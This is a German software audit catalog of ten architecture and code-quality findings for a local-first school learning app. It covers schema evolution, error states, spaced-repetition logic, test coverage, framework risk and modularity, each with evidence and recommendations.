# Befundkatalog – Gesamtaudit Lernraum 2026-10-19

Vollständiger Katalog aller Befunde mit den im Auftrag geforderten Feldern.
Erzeugt aus den Prüfberichten `agent-*.md`; lange Felder sind gekürzt und
verweisen auf den Bericht. **Schwere und Prüfurteil berücksichtigen die
Gegenprüfung durch das Red Team (F) und die Hauptinstanz**; maßgeblich ist
der Abschlussbericht `../2026-10-19-lernraum-gesamtaudit.md`. Alle
Empfehlungen sind Vorschläge zur Prüfung.

Evidenzstatus: bestätigt (reproduziert) · bestätigt (Codeanalyse) ·
begründetes Risiko · offene Frage. Aufwand: S (Tage) · M (Wochen) · L (Monate).

## A – Architektur und Codequalität

### A-001 – Ein einziges unpassendes Lernereignis legt alle Lernstandsprojektionen lahm; strikte Schemata verhindern Vorwärtskompatibilität und Rollback

- **Bereich:** Datenhaltung, Datenverträge, Betrieb
- **Schwere:** P2 (Prüfinstanz: P1)
- **Evidenzstatus:** bestätigt (reproduziert)
- **Gegenprüfung:** abgeschwächt (F, reproduziert): Mechanismus bestätigt, entsteht aber nur bei Versionsschiefe auf demselben Gerät oder Speicherschaden; Fremdgeräte blockieren stattdessen den Import. Als Ursachenbündel „Schemaevolution“ mit B-001 insgesamt P1. Empfehlung (3) nicht übernehmen: Ereignisse mit unbekannten Pflichtwerten in Quarantäne statt auf „unbekannt“ abbilden; wichtiger als (4) ist ein Strukturtest über alle Tabellen (Roadmap S2, K1).
- **Beschreibung:** _Konzept:_ Der Kommentar verspricht additive, rückwärtskompatible Erweiterungen innerhalb von v1; `docs/architecture.md` beschreibt, dass `math` „additiv“ ergänzt wurde. _Implementierung:_ Das Ereignisschema ist `.strict()`, alle Enums sind geschlossen, und jede Projektion validiert **alle** Ereignisse mit `parse`. Ein einziger Datensatz mit einem unbekannten Feld oder Enum-Wert (neuere App-Version, zurückgerollte Version, zweiter Tab mit altem Stand, beschädigter Datensatz) lässt Empfehlungen, Tagesportion, Mathe-Wiederholung und Ereignisliste vollständig scheitern. Der Lehrer-Abgleich ist dagegen tolerant gebaut – der Lernkern der Kinder ist also robuster geschützt als nötig gegen Veränderung und schwächer geschützt gegen Ausfall.
- **Belege:** `src/domain/learning-bundle.ts:4` (Kommentar „Keep additive changes backward compatible within v1“), `:16-31` (geschlossene Enums `eventSourceSchema`, `learningAreaSchema`), `:74-109` (`learningEventV1Schema … .strict()`); Lesewege mit `parse` statt `safeParse`: `src/storage/personal-learning-events.ts:753-756` (`list`), `src/storage/learning-recommendations.ts:179-190` (`list`), `src/storage/daily-plan.ts:176-182` (`readSources`) und `:232-238` (`progress`), `src/storage/math-practice.ts:68` … (vollständig in `agent-a-architektur.md`); `repro-a/a-poison-event.test.tsx`: ein gültiges und ein Ereignis mit Zusatzfeld `confidence` in die Tabelle `learningEvents`. Ergebnis: alle vier Lesewege werfen `ZodError`; `LearnerHome` zeigt „Heute ist nichts dran – frei üben“ statt „0 von 20 Aufgaben heute“.
- **Betroffene:** alle Schülerinnen und Schüler auf betroffenen Geräten; Lehrkraft beim Ausrollen/Zurückrollen von Versionen.
- **Folgen:** Nach einem fehlerhaften Release ist ein Rollback nicht gefahrlos möglich: Geräte, die mit der neuen Version Ereignisse geschrieben haben, verlieren mit der alten Version stumm Tagesportion und Wiederholungen (Daten bleiben gespeichert, sind aber unsichtbar). Jede künftige Erweiterung des Vertrags (neues Modul, neues Feld) bricht ältere Geräte im Mischbetrieb (Schul-iPad aktualisiert, Heimgerät nicht).
- **Empfehlung (Vorschlag zur Prüfung):** (1) Lesen tolerant machen: `safeParse` je Datensatz, ungültige Ereignisse in eine Quarantäne-Liste und einen sichtbaren Hinweis „n Einträge konnten nicht gelesen werden“, Projektionen über den Rest. (2) Für Lesen ein nicht-striktes Schema (unbekannte Felder entfernen statt ablehnen), für Schreiben das strikte. (3) Unbekannte Enum-Werte beim Lesen auf „unbekannt“ abbilden und in Projektionen ignorieren. (4) `schemaVersion` je Ereignis. (5) Regressionstest „Ereignis aus Version n+1 in Version n“.
- **Aufwand:** M
- **Erfolgskriterium:** Ein Test schreibt ein Ereignis mit unbekanntem Feld und unbekanntem `source` in die Datenbank; Startseite, LernBox-Portion und Mathe-Wiederholung zeigen weiterhin die übrigen Daten und einen Hinweis.
- **Quelle:** `agent-a-architektur.md`

### A-002 – Fehler sehen aus wie leere Daten oder enden in Dauer-Laden; keine einheitliche Fehlerbehandlung

- **Bereich:** Fehlerbehandlung, Zustände
- **Schwere:** P2
- **Evidenzstatus:** bestätigt (reproduziert)
- **Gegenprüfung:** nicht gesondert geprüft (P2/P3)
- **Beschreibung:** _Konzept:_ `docs/engineering-quality.md` Regel 6: „Laden, leer, erfolgreich, offline, eingeschränkt und fehlgeschlagen werden als eigene Zustände behandelt. Fehler dürfen nicht wie leere Daten aussehen.“ Der Projekt-Skill wiederholt das. _Implementierung:_ Jeder Container löst Laden/Fehler selbst. Kopfrechnen, Wortspeicher und Textbox tun es vorbildlich; Startseite, LernBox und Tastenwelt nicht. Es gibt keine Fehlergrenzen, keine globale Behandlung unbehandelter Promises, 145 `void`-Aufrufe ohne `.catch` und keinerlei Protokollierung (0 × `console.error`), also auch keine Möglichkeit, einen Fehler vom Schülergerät zu diagnostizieren.
- **Belege:** `app/lernen/use-learner-dashboard.ts:63-119` (`load().catch` setzt `loaded: true` mit leerem Stand), `app/lernen/learner-home.tsx:13-60` (`loaded` wird nicht an die Ansicht weitergereicht), `app/views/lernen/home-screen.tsx:113-119`; `app/components/learning-box-app.tsx:222-241` (`refresh` ohne Fehlerzweig), `:243-245` (`migrateLegacyLearningBox().then(…)` ohne `catch`), `:392-412` (`assess` ohne `try/catch`, Aufruf per `void`); `app/views/lernbox/parts/home.tsx:88-89`; … (vollständig in `agent-a-architektur.md`); `repro-a/a-storage-unavailable.test.tsx` (IndexedDB wirft `SecurityError`, wie in Safari/Firefox bei blockierten Website-Daten): LernBox bleibt dauerhaft bei „LernBox wird geladen …“ (unbehandelte Rejection), Startseite „Heute ist nichts dran – frei üben“, Tastenwelt „0 von 50 Stationen geschafft“. Zusätzlich P5 (Giftereignis → „nichts dran“).
- **Betroffene:** Schülerinnen und Schüler (sehen „nichts zu tun“ oder einen verlorenen Fortschritt), Lehrkraft (bekommt keine Fehlermeldung, nur „das Kind hat nichts gemacht“).
- **Folgen:** Stumme Datenverluste (Tastenwelt-Runde gilt als abgeschlossen, wird aber nicht gespeichert), falsche Rückmeldung „Tagesziel erledigt“, Supportfälle ohne Diagnosemöglichkeit; bei einem Renderfehler weißer Bildschirm statt Wiederherstellungsangebot.
- **Empfehlung (Vorschlag zur Prüfung):** Ein gemeinsamer Ladebaustein (z. B. `useLoad<T>()` mit Zustand `loading | ready | empty | error`) statt Eigenbau je Container; `error.tsx` je Bereich (Schüler, Lehrkraft, Raum) mit „Neu laden“ und „Sicherung herunterladen“; globale `unhandledrejection`-Erfassung in ein lokales Diagnoseprotokoll (ohne Personenbezug), das die Lehrkraft exportieren kann; ESLint-Regel `@typescript-eslint/no-floating-promises` (typbewusst) einführen.
- **Aufwand:** M
- **Erfolgskriterium:** Für jeden Schüler-Container existiert ein Test „Speicher nicht verfügbar“ mit sichtbarem `role="alert"`; `no-floating-promises` ist aktiv; es gibt eine Fehlergrenze je Bereich.
- **Quelle:** `agent-a-architektur.md`

### A-003 – Ereignisquelle nur dem Namen nach: Lernstände sind überwiegend veränderliche Primärzustände; nach dem Gerätezusammenführen widersprechen sich Kartenstand und Ereignisse

- **Bereich:** Architektur, Datenmodell, Synchronisation
- **Schwere:** P2
- **Evidenzstatus:** bestätigt (reproduziert)
- **Gegenprüfung:** Empfehlung eingeschränkt (F, Teil 6.2): Variante b (ehrliches Protokoll) statt vollständiger Ereignisquelle (Roadmap M2).
- **Beschreibung:** _Konzept:_ Vault 06: „Boxstand und Fälligkeit werden aus unveränderlichen Lernereignissen abgeleitet. Dadurch entsteht kein zweiter widersprüchlicher Lernstand.“ `docs/engineering-quality.md` Regel 3: Projektionen „müssen reproduzierbar neu berechnet werden können“; LernBox-Kartenstand sei ein „Zwischenspeicher“. _Implementierung:_ Echte Ereignisquelle ist nur Mathe (`mathReviews` als reine Projektion) und die Vokabel-Ereignisse ohne Karte. LernBox-Karte, Lernwort-Fortschritt, Tastenwelt-Fortschritt und Textbox-Einheiten sind veränderliche Primärzustände; Ereignisse sind ein Begleitprotokoll. Das Nachspielen existiert nur im Test, die nötigen „Ausgangsstände“ (Platzierung, Sicherung, Neuanlage) werden nirgends gespeichert – ein Nachspielen in Produktion ist also grundsätzlich unmöglich. Für Lernwörter fehlen Merkstufe und Box im Ereignis; der Stand ist nicht rekonstruierbar. … (vollständig in `agent-a-architektur.md`)
- **Belege:** `src/domain/learning-box-replay.ts:106-128` (`replayLearningBoxCard`, nur in Tests verwendet: `src/domain/learning-box.test.ts`, `src/storage/learning-box.test.ts`); `src/storage/personal-learning-events.ts:360-397` (`putCardAndEvent`: Kartenstand wird gespeichert, Ereignis daneben), `:669-680` (Platzierung aus Unterrichtsrunde ohne Ereignis), `:793-861` (`recordAttempt` Lernwörter: Ereignis ohne Merkstufe/Box), `:1175-1232` (`importFromLesson`: setzt Box/Fälligkeit ohne Ereignis); … (vollständig in `agent-a-architektur.md`); `repro-a/a-merge-divergence.test.ts`: Gerät B übt die Rückrichtung (früher), Gerät A die Vorwärtsrichtung (später); Handabgleich B → A. Ergebnis `added 1, conflicts 1`, gespeichert `reverseBox 2`, Nachspielen der nun vorhandenen Ereignisse `reverseBox 3`. Der Konflikt wird in der Cloud-Meldung nicht erwähnt.
- **Betroffene:** Kinder mit zwei Geräten (Schule/Zuhause) oder Gerätewechsel; künftig alle, sobald eine Lernregel korrigiert werden muss.
- **Folgen:** Stiller Fortschrittsverlust nach dem Abgleich; ein korrigierter Fehler in der Lernlogik (siehe A-004) kann nicht rückwirkend auf vorhandene Lernstände angewendet werden – entgegen der Regel „Änderungen der Lernlogik benötigen Regressionstests mit bestehenden Lernhistorien“. Die Dokumentation erweckt eine Sicherheit, die der Code nicht bietet; die Kosten der Ereignisquelle (Identitäten, Unveränderlichkeit, Speicherwachstum) fallen an, ihr Nutzen nicht.
- **Empfehlung (Vorschlag zur Prüfung):** Bewusst entscheiden und dokumentieren. Variante a (empfohlen, wenn Mehrgerätenutzung ein Ziel ist): Ereignisse vollständig machen (Merkstufe, Box vorher/nachher, Platzierung als eigenes Ereignis `placement`, Sicherungsimport als `baseline`), Projektionen aus Ereignissen berechnen und nur als Cache speichern, Zusammenführen = Vereinigung der Ereignisse + Neuberechnung. Variante b: Ereignisse ehrlich als Protokoll führen, Regel 3 und Vault 06 anpassen, Zusammenführen pro Richtung/Feld statt pro Karte und Konflikte sichtbar machen.
- **Aufwand:** L
- **Erfolgskriterium:** Der Merge-Test aus `a-merge-divergence` ergibt `reverseBox 3`; ein Test baut alle Projektionen aus einer Sicherung mit nur Ereignissen deterministisch neu auf; Doku und Code stimmen überein.
- **Quelle:** `agent-a-architektur.md`

### A-004 – Mehrere parallele Wiederholungslogiken mit widersprüchlichen Regeln; Lernwörter verletzen die eigene Leitner-Spezifikation

- **Bereich:** Fachlogik, Integrationsregel
- **Schwere:** P1
- **Evidenzstatus:** bestätigt (reproduziert)
- **Gegenprüfung:** bestätigt (Hauptinstanz und F): mit D-001 als ein Kernbefund geführt. F ergänzt: Die Wortauswahl im Wortspeicher ist zufällig; der Leitner-Stand steuert nur Tagesportion und „sicher“-Anzeige.
- **Beschreibung:** _Konzept:_ `docs/architecture.md`: „keine parallele Eigenimplementierung derselben Fachregel“. Vault 06, Grundregeln: „Nach einem Fehler doch richtig → bleibt in Box 1“, „höchstens ein Aufstieg je Runde“, „Kein Aufstieg vor der Fälligkeit“ (für die LernBox ausdrücklich, als „strengere Regel des Lernraums“). _Implementierung:_ Mindestens vier eigenständige Wiederholungsmaschinen (LernBox-Karte, Ereignis-Leitner, Lernwort, Mathe) plus zwei Platzierungsregeln. Sie teilen nur die Intervalltabelle, nicht die Regeln: „zu frühes Üben“ verhindert den Aufstieg in LernBox und Mathe, nicht bei Lernwort und Ereignis-Leitner; „Fehler schließen ohne Aufstieg“ gilt in LernBox (8-h-Fenster) und Ereignis-Leitner, nicht bei Lernwörtern. Die Empfehlungs- und Portionslogik entscheidet zusätzlich doppelt (`learning-recommendations.ts` und `storage/daily-plan.ts`).
- **Belege:** `src/domain/learning-word-progress.ts:24-68` (`updateLearningWordProgress`), `src/domain/leitner-schedule.ts:33-99` (`deriveLeitnerProgress`), `src/domain/learning-box.ts:352-433` (`processLearningBoxResult`) und `:444-470` (`placeLiveVocabularyCard`), `src/domain/math-practice.ts:171-228` (`mathReviews`), `src/domain/live-vocabulary-placement.ts`, `src/domain/vocabulary-session.ts`; Test, der das Verhalten festschreibt: `src/domain/learning-word-progress.test.ts:40-62` (neun Aufstiege zum … (vollständig in `agent-a-architektur.md`); `repro-a/a-leitner-divergence.test.ts`. Fünfmal richtig in 40 Minuten: LernBox Box 2/3 Tage; **Lernwort Box 5, Merkstufe 6, 30 Tage**; Ereignis-Leitner Box 5/30 Tage; Mathe Stufe 1/1 Tag. Fehler, 10 Minuten später richtig: LernBox und Ereignis-Leitner Box 1, **Lernwort Box 2**.
- **Betroffene:** Kinder im Wortspeicher (Kern des Rechtschreibziels), Lehrkräfte, die sich auf „gefestigt“ verlassen.
- **Folgen:** Ein Kind, das dieselbe Wortbox an einem Nachmittag mehrfach übt, gilt für alle Wörter als „gemeistert“; die Wörter verschwinden für 30 Tage aus der Tagesportion – die verteilte Wiederholung wird für das Kernmodul ausgehebelt. Gleich benannte Begriffe („Box 1–5“, „fällig“) bedeuten in jedem Modul etwas anderes; jede Regeländerung muss an mehreren Stellen nachgezogen werden.
- **Empfehlung (Vorschlag zur Prüfung):** Ein gemeinsamer, reiner Wiederholungskern (`spaced-repetition.ts`) mit expliziter Regelkonfiguration (Intervalle, Erholungsfenster, Aufstieg nur ab Fälligkeit, ein Aufstieg je Runde, Hilfe-/Selbstkorrektur-Behandlung); Module übergeben nur ihre Ergebnisse. Die Vault-Tabelle als tabellengetriebener Regressionstest für jedes Modul; Eigenschaftstest „Aufstieg höchstens einmal je Fälligkeit“. Bestehende Lernwort-Stände nach Korrektur neu bewerten (setzt A-003 voraus oder eine einmalige Heuristik).
- **Aufwand:** M
- **Erfolgskriterium:** Alle Module bestehen dieselbe Regeltabelle aus Vault 06; `a-leitner-divergence` liefert für Lernwörter Box 2 bzw. Box 1.
- **Quelle:** `agent-a-architektur.md`

### A-005 – Die Abdeckungszahl 96 % ist für die Gesamtanwendung irreführend; Tests schreiben teilweise Fehlverhalten fest

- **Bereich:** Testbarkeit, Qualitätssicherung
- **Schwere:** P2
- **Evidenzstatus:** bestätigt (reproduziert)
- **Gegenprüfung:** nicht gesondert geprüft (P2/P3)
- **Beschreibung:** _Implementierung:_ `app/` (38 836 Zeilen, 69 Testdateien) und `src/tastschreiben` werden nicht gemessen. Gemessen inklusive dieser Bereiche: 78,7 % Zeilen, 72,2 % Zweige statt 96,1 %. Ungedeckt sind gerade Abläufe mit Datenfolgen: Tastenwelt-Übung und -Speicherung (0 %), Sicherung/Wiederherstellung in den Schülereinstellungen (0 %), Laufdiktat allein (0 %), Update-Hinweis des Service Workers (0 %), LernBox-Container (44 % Zeilen, 35 % Zweige), Cloud-Panel (29 %). `src/tastschreiben` läge mit 81,3 % Zweigen unter der eigenen 85-%-Schwelle. Zudem prüfen manche Tests das Ist- statt des Soll-Verhaltens (A-004: Test bestätigt neun Aufstiege an einem Zeitpunkt). Eigenschaftstests gibt es in 6 Dateien, davon 3 im Cloud-Abgleich – keine für die Lernregeln von Lernwort, Mathe oder Ereignis-Leitner.
- **Belege:** `vitest.config.ts:23-28` (`coverage.include` nur `src/domain`, `src/storage`, `src/speech`, `src/integrations`); `src/tastschreiben/` fehlt; `docs/engineering-quality.md` („Mindestabdeckung“).; P4 (Vitest mit `--coverage.include='app/**/*.{ts,tsx}' --coverage.include='src/**/*.{ts,tsx}'`, Bericht im Scratchpad).
- **Betroffene:** Entwickler/Lehrkraft (falsches Sicherheitsgefühl), indirekt alle Nutzer.
- **Folgen:** Regressionen in Containern (z. B. A-002) bleiben unentdeckt, obwohl die Kennzahl „grün“ ist.
- **Empfehlung (Vorschlag zur Prüfung):** Zwei Kennzahlen ausweisen (Kern streng, `app/` mit realistischer, steigender Schwelle, z. B. 70 %/60 %); `src/tastschreiben` in den Kern aufnehmen; je Container ein Test für Speicherfehler; Lernregeln mit tabellengetriebenen Soll-Tests aus dem Vault absichern.
- **Aufwand:** S (Konfiguration) bis M (fehlende Tests)
- **Erfolgskriterium:** `npm run check` misst `app/` und `src/tastschreiben`; die Doku nennt beide Zahlen.
- **Quelle:** `agent-a-architektur.md`

### A-006 – Browser-Tests prüfen den Entwicklungsserver, nicht das ausgelieferte Artefakt

- **Bereich:** Testarchitektur, CI
- **Schwere:** P2
- **Evidenzstatus:** bestätigt (Codeanalyse); lokale Nichtstartbarkeit des Produktionsservers von der Hauptinstanz reproduziert
- **Gegenprüfung:** nicht gesondert geprüft (P2/P3)
- **Beschreibung:** Die gesamte Cross-Browser-Suite läuft gegen `vinext dev` mit eingeschalteter Vorschau (alle `vorschau`-Bereiche sichtbar, im Schulbetrieb nicht), ohne Service Worker, seriell wegen Bedarfskompilierung und mit zwei Wiederholungen je Test. Das Produktionsbundle (Minifizierung, RSC im Produktionsmodus, Worker-Laufzeit, Service Worker) wird nur über 13 serverseitige HTML-Prüfungen berührt; eine Hydration im Browser gegen den Produktions-Build findet nie statt. Lokal lässt sich kein Produktionsserver starten (`ERR_UNSUPPORTED_ESM_URL_SCHEME`, Protokoll der Hauptinstanz).
- **Belege:** `playwright.config.ts:28-33` (`webServer.command: "npm run dev"`), `:12-14` (`workers: 1`, `retries: 2` in CI), `:24` (`serviceWorkers: "block"`); `.github/workflows/quality.yml:98-99` (`npm run build`, danach Playwright gegen `npm run dev` – Build bleibt ungenutzt); `app/release/release-config.ts:15-18` (Vorschau ist außerhalb von `NODE_ENV=production` immer an); `tests/rendered-html.test.mjs` (13 Zeichenkettenprüfungen gegen den Produktions-Worker).; Konfiguration lesen; `scratchpad/prod-server.log`.
- **Betroffene:** alle (Fehler, die nur im Produktionsmodus auftreten, erreichen die Nutzer ungetestet).
- **Folgen:** Produktionsspezifische Fehler (z. B. der dokumentierte Manifest-Fehler von vinext) werden erst im Einsatz bemerkt; `retries: 2` kann instabile Tests verdecken.
- **Empfehlung (Vorschlag zur Prüfung):** Mindestens ein Chromium- und ein WebKit-Projekt gegen den Produktions-Build in der Worker-Laufzeit (z. B. `wrangler dev` auf `dist/`) und im Schulbetrieb ohne Vorschau; den ungenutzten Build-Schritt entweder nutzen oder entfernen; Wiederholungen nur mit Meldung „flaky“ zulassen.
- **Aufwand:** M
- **Erfolgskriterium:** Ein CI-Job führt `platform-quality.spec.ts` gegen das gebaute Worker-Artefakt ohne Vorschau-Cookie aus.
- **Quelle:** `agent-a-architektur.md`

### A-007 – Plattformrisiko: junges Framework, Cloudflare-gebundenes dynamisches SSR und RSC-Navigation für eine Local-first-PWA

- **Bereich:** Abhängigkeiten, Architekturgrundentscheidung
- **Schwere:** P2
- **Evidenzstatus:** begründetes Risiko (Teilfakten bestätigt: P11, P13, P14)
- **Gegenprüfung:** Empfehlung eingeschränkt (F, Teil 6.1): Wechsel auf statischen Build vertagen, jetzt nur den kleinen Teil umsetzen (Roadmap L2).
- **Beschreibung:** _Konzept:_ Local-first-PWA, Daten nur auf dem Gerät, datenschutzfreundlich, offline nutzbar, langfristig schulartübergreifend. _Implementierung:_ Das Root-Layout liest bei jeder Anfrage Cookies und Header; damit ist jede Seite dynamisch serverseitig gerendert, und jede Client-Navigation lädt eine RSC-Nutzlast vom Server (P11). Fachlich nötig ist der Server nur für Freigabe-Cookie, Umgebungsvariablen und Metadaten – alles ließe sich zur Build-Zeit oder im Client lösen. Das Framework vinext ist acht Monate alt, seit drei Wochen 1.0, hat eine Hauptperson als Maintainer, vier Releases in 17 Tagen und rät im README selbst zur Vorsicht im Produktivbetrieb („OpenNext is the safer choice“). Der Produktionsserver lässt sich außerhalb von Cloudflare nicht starten. `vinext` und `react-server-dom-webpack` stehen als Entwicklungsabhängigkeiten, landen aber im Worker-Bundle – `npm audit --omit=dev` … (vollständig in `agent-a-architektur.md`)
- **Belege:** `package.json` (`vinext 1.1.0`, `@vitejs/plugin-rsc`, `@cloudflare/vite-plugin`), `vite.config.ts:1-80`, `worker/index.ts`, `app/layout.tsx:38-41` (`headers()`) und `:96-100` (`cookies()`), `proxy.ts`; Vorlagenreste: `.openai/hosting.json`, `build/sites-vite-plugin.ts` (kopiert nicht existierende `drizzle/`), `vite.config.ts` (D1/R2-Platzhalter „site-creator“), `worker/index.ts` (Bildoptimierung mit `IMAGES`-Bindung), `app/chatgpt-auth.ts` (ungenutzt), `scripts/service-worker.template.js` … (vollständig in `agent-a-architektur.md`); P11 (RSC-Fetch), P13 (Registry), P14 (README), `prod-server.log`.
- **Betroffene:** alle; Schulträger (Betrieb, Datenschutz-Folgenabschätzung muss einen Server-Dienstleister berücksichtigen, obwohl keine Lerndaten dorthin fließen).
- **Folgen:** Offline-Navigation hängt vom Fallback-Verhalten des Frameworks und vom Cache bereits besuchter Seiten ab; Breaking Changes oder Aufgabe von vinext treffen die gesamte Anwendung; Wechsel des Hostings erfordert Umbau. Die Vorlagenreste verwirren und vergrößern die Angriffs- und Pflegefläche.
- **Empfehlung (Vorschlag zur Prüfung):** Architekturentscheidung neu bewerten: Für eine Anwendung, die zu 80 % aus Client-Komponenten besteht und keine Serverdaten nutzt, ist ein statischer Build (Vite-SPA mit Router oder statischer Export) mit vorab gecachten Routen einfacher, offline robuster und hosterunabhängig; Supabase bleibt clientseitig. Kurzfristig: Freigabestufen und öffentliche Konfiguration zur Build-Zeit einbetten, dynamische Server-APIs aus dem Root-Layout entfernen, Vorlagenreste löschen, Ausstiegsplan dokumentieren.
- **Aufwand:** L (Wechsel) / S (Aufräumen)
- **Erfolgskriterium:** Alle Seiten lassen sich als statische Dateien ausliefern; Client-Navigation funktioniert ohne Netz für alle Lernbereiche; keine Vorlagenreste.
- **Quelle:** `agent-a-architektur.md`

### A-008 – Komplexität ohne entsprechenden Nutzen: Lehrer-Geräteabgleich, doppelte Abgleichwege, Eigen-SHA-256, tote und prototypische Pfade

- **Bereich:** Komplexität, Wartbarkeit
- **Schwere:** P2
- **Evidenzstatus:** bestätigt (Codeanalyse)
- **Gegenprüfung:** nicht gesondert geprüft (P2/P3)
- **Beschreibung:** Der automatische Geräteabgleich einer einzelnen Lehrkraft (HLC, Merge-Engine, Grabsteine, Duplikaterkennung, Umschlag-Verschlüsselung, drei Anbieter) ist mit ≈ 6 100 Zeilen Produktionscode größer als alle fünf Schüler-Lerncontainer zusammen (LernBox, Wortspeicher, Kopfrechnen, Textbox, Tastenwelt: ≈ 3 400 Zeilen). Daneben existiert weiter der Handabgleich v1 (unverschlüsselt, andere Datei). Die SHA-256-Eigenimplementierung dient nur der Änderungserkennung, widerspricht aber dem Wortlaut von Regel 7 („Keine eigene Kryptografie“) und existiert nur, damit `merge.ts` synchron bleibt. Für die Kernziele (Rechtschreib-/Mathe-Grundkompetenzen) trägt dieser Teil nichts bei, bindet aber Pflegeaufwand und Prüfkapazität.
- **Belege:** `src/integrations/cloud-sync/` (≈ 3 760 Zeilen Logik ohne `testing/`, ≈ 3 150 Zeilen Unit-Tests), Cloud-Oberfläche ≈ 2 330 Zeilen (`app/components/cloud-*`, `sync-conflicts-host.tsx`, `app/ui/cloud-*`, `app/ui/sync-conflicts.tsx`, `app/sync/`); zweiter Lehrerweg v1: `src/integrations/cloud-sync/sync.ts:41-59`, eingeblendet in `app/components/cloud-sync-setup.tsx:118`; eigene SHA-256-Implementierung `src/integrations/cloud-sync/hash.ts:1-85`; Klassenstempel ECDSA `src/domain/class-seal.ts` … (vollständig in `agent-a-architektur.md`); Zeilenzählung (P15); Importanalyse; Lesen der genannten Stellen.
- **Betroffene:** Entwickler/Lehrkraft (Pflege), indirekt alle.
- **Folgen:** Verteilte Aufmerksamkeit (A-001 bis A-004 betreffen den Lernkern, während Randfunktionen ausgebaut sind); mehr Fläche für Fehler und Sicherheitsprüfung.
- **Empfehlung (Vorschlag zur Prüfung):** Funktionsstopp für Randfunktionen bis zur Stabilisierung des Lernkerns; v1-Lehrerabgleich entfernen; Hash vor dem Merge asynchron mit Web Crypto berechnen oder eine nicht-kryptografische Prüfsumme verwenden; tote Zweige, `chatgpt-auth.ts`, `LocalRepositoryFactory`, `secondChance` löschen; Häuser/Duell in einen Feature-Branch oder ein Archiv auslagern. Prüfen, ob „Vorbereiten zu Hause, Unterricht an der Tafel“ nicht mit einer verschlüsselten Datei-Übergabe ausreichend gelöst ist.
- **Aufwand:** M
- **Erfolgskriterium:** Kein ungenutzter Produktionscode (Prüfung z. B. mit `knip`); dokumentierte Begründung pro Randfunktion mit Nutzen für die Kernziele.
- **Quelle:** `agent-a-architektur.md`

### A-009 – Erweiterbarkeit: kein Modulvertrag; ein neues Lernmodul berührt rund 20 Dateien und mehrere geschlossene Enums

- **Bereich:** Erweiterbarkeit, Schul-Rollout
- **Schwere:** P2
- **Evidenzstatus:** bestätigt (Codeanalyse); Rollout-Aussagen begründetes Risiko
- **Gegenprüfung:** nicht gesondert geprüft (P2/P3)
- **Beschreibung:** _Konzept:_ `docs/architecture.md`: Module „stellen ihre nativen Fälligkeiten über einen Modul-Adapter bereit“. _Implementierung:_ Einen solchen Adapter gibt es nicht; Empfehlung und Tagesportion kennen jedes Modul explizit. Die zuletzt ergänzte Textbox berührt 19 Produktionsdateien außerhalb ihres Moduls, dazu Dexie-Version, Sicherungsschema und E2E-Listen. Ein Modul „Bruchrechnen“ bräuchte: Route + Container + Ansicht, Freigabebereich, `classModuleSchema`, `learningAreaSchema` (bzw. `math`-Erweiterung), ggf. `eventSourceSchema`, `DAILY_PLAN_MODULES`, Kandidaten in Empfehlung und Portion, Fortschrittsseite, Dashboard-Zuordnung, Lehrer-Klassenkonfigurator, Sicherungsschema, ggf. Dexie-Version und Raum-Modus (SQL). Wegen A-001 bricht jede Enum-Erweiterung ältere Geräte und ältere Lehrkraft-Pakete. Für Schul-Rollout fehlen strukturell: mehrere Lehrkräfte pro Klasse (Klassenstempel und … (vollständig in `agent-a-architektur.md`)
- **Belege:** geschlossene Modullisten: `src/domain/class-workspace.ts:3` (`classModuleSchema`), `src/domain/learning-bundle.ts:16-31`, `src/domain/daily-plan.ts:16` (`DAILY_PLAN_MODULES`), `src/domain/release.ts` (`RELEASE_AREAS`), `src/domain/personal-learning-space.ts`, `app/lernen/dashboard-data.ts:11`, `app/lernen/use-learner-dashboard.ts` (`openByModule`), `src/storage/learning-recommendations.ts:17-25` (`eventModule`) und `:171-345` (modulweise Sonderfälle), `src/storage/daily-plan.ts:88-170`, … (vollständig in `agent-a-architektur.md`); `grep -rliE "textbox" app src` außerhalb des Moduls (19 Treffer); Lesen der Enums.
- **Betroffene:** Entwicklung, künftige Schulen/Schularten, Fachlehrkräfte an der Mittelschule.
- **Folgen:** Jeder Ausbau multipliziert die Fehlerstellen aus A-004; schulartübergreifende Inhalte erfordern Code-Releases.
- **Empfehlung (Vorschlag zur Prüfung):** Modulvertrag (`LearningModule` mit `id`, `routes`, `candidates(state, now)`, `isCompletedBy(event)`, `progressSummary`) und Registry, aus der Freigabe, Empfehlung, Portion und Dashboard gespeist werden; offene Modul-IDs als String mit bekannter Liste statt geschlossener Enums in gespeicherten Daten; Inhalte als versionierte JSON-Pakete. Mehrlehrkraft-/Schulbetrieb als ausdrückliche Nicht-Ziel- oder Ziel-Entscheidung festhalten.
- **Aufwand:** L
- **Erfolgskriterium:** Ein Beispielmodul lässt sich mit ≤ 5 Berührungspunkten außerhalb seines Ordners ergänzen; ältere Geräte ignorieren unbekannte Module ohne Fehler.
- **Quelle:** `agent-a-architektur.md`

### A-010 – Architekturregeln nur teilweise maschinell abgesichert

- **Bereich:** Schichtentreue
- **Schwere:** P3
- **Evidenzstatus:** bestätigt (reproduziert)
- **Gegenprüfung:** nicht gesondert geprüft (P2/P3)
- **Beschreibung:** _Konzept:_ Regel 1/4/5: Kern kennt „Oberfläche, Browser und Speicher nicht“; „Direkter IndexedDB-Zugriff aus Komponenten ist verboten“; „Bausteine sind reine Darstellung ohne Speicherzugriff“. _Implementierung:_ Der Kern hält die Regel heute tatsächlich ein (P1) – aber nur durch Disziplin: ESLint ließe `dexie`, `storage`, `integrations` und `@supabase` in `src/domain` zu; `src/tastschreiben` (Fachlogik) ist gar nicht erfasst; `app/components` darf `dexie` importieren; `app/ui` greift auf Speicher zu; eine „reine“ Ansicht nutzt `localStorage` direkt.
- **Belege:** `eslint.config.mjs:62-78` (Kern: nur `next`, `react`, `@/app/*` verboten), `:79-100` (Ansichten); `app/ui/shell/student-shell.tsx:4`, `app/ui/use-learner-profile.ts:8`, `app/ui/shell/use-teacher-nav-data.ts:8`, `app/views/tastenwelt/keyboard-settings.ts:25,50`.; P3 (`repro-a/eslint/check-rules.mjs`).
- **Betroffene:** Entwicklung (insbesondere KI-Agenten, die sich auf die Regeln verlassen).
- **Folgen:** Schleichende Erosion der Schichten bei weiterem Ausbau.
- **Empfehlung (Vorschlag zur Prüfung):** Verbotsmuster für `src/domain` und `src/tastschreiben` um `dexie`, `@supabase/*`, `**/storage/*`, `**/integrations/*` ergänzen; `app/components` ohne `dexie`; `no-restricted-globals` (`localStorage`, `indexedDB`) für `app/views` und `app/ui`; ggf. `dependency-cruiser` für transitive Regeln.
- **Aufwand:** S
- **Erfolgskriterium:** Alle 14 Fälle aus P3 werden wie dokumentiert blockiert.
